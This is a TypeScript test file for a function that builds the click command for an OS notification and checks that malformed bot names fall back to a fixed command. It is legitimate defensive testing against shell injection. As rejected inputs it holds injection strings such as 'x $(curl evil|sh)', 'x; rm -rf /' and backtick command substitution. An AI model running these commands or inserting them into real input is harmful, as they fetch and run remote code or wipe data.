/**
 * osNotifyExecFor (composite review P1.2) — the ONLY builder of the
 * `--exec` string the Omarchy notification daemon will shell-run on click.
 * Contract: exactly two fixed shapes; malformed input degrades to the
 * argument-less focus command, never to interpolation.
 */
import { describe, expect, it } from 'vitest'

import { BOT_PROFILE_RE, osNotifyExecFor } from './os-notify'

describe('osNotifyExecFor', () => {
  it('builds the per-bot engage command for a valid profile', () => {
    expect(osNotifyExecFor('test-bot')).toBe('botmarchy-focus --bot test-bot')
    expect(osNotifyExecFor('a')).toBe('botmarchy-focus --bot a')
    expect(osNotifyExecFor('a'.repeat(63))).toBe(`botmarchy-focus --bot ${'a'.repeat(63)}`)
  })

  it('degrades to the argument-less focus for anything else', () => {
    expect(osNotifyExecFor(undefined)).toBe('botmarchy-focus')
    expect(osNotifyExecFor(null)).toBe('botmarchy-focus')
    expect(osNotifyExecFor('')).toBe('botmarchy-focus')
    // Shell metacharacters never reach the command — the review's exact
    // exploit string included.
    expect(osNotifyExecFor('x $(curl evil|sh)')).toBe('botmarchy-focus')
    expect(osNotifyExecFor('x; rm -rf /')).toBe('botmarchy-focus')
    expect(osNotifyExecFor('x`id`')).toBe('botmarchy-focus')
    expect(osNotifyExecFor('UPPER')).toBe('botmarchy-focus')
    expect(osNotifyExecFor('has space')).toBe('botmarchy-focus')
    expect(osNotifyExecFor('профиль')).toBe('botmarchy-focus')
    expect(osNotifyExecFor(42)).toBe('botmarchy-focus')
    expect(osNotifyExecFor({})).toBe('botmarchy-focus')
  })

  it('profile charset matches the gateway id shape (length + charset bounds)', () => {
    // Mirrors hermes_cli/profiles.py _PROFILE_ID_RE exactly: 1 + 63 max.
    expect(BOT_PROFILE_RE.test('a'.repeat(64))).toBe(true)
    expect(BOT_PROFILE_RE.test('a'.repeat(65))).toBe(false)
    expect(BOT_PROFILE_RE.test('-leading')).toBe(false)
    expect(BOT_PROFILE_RE.test('ok-dash_under123')).toBe(true)
  })
})
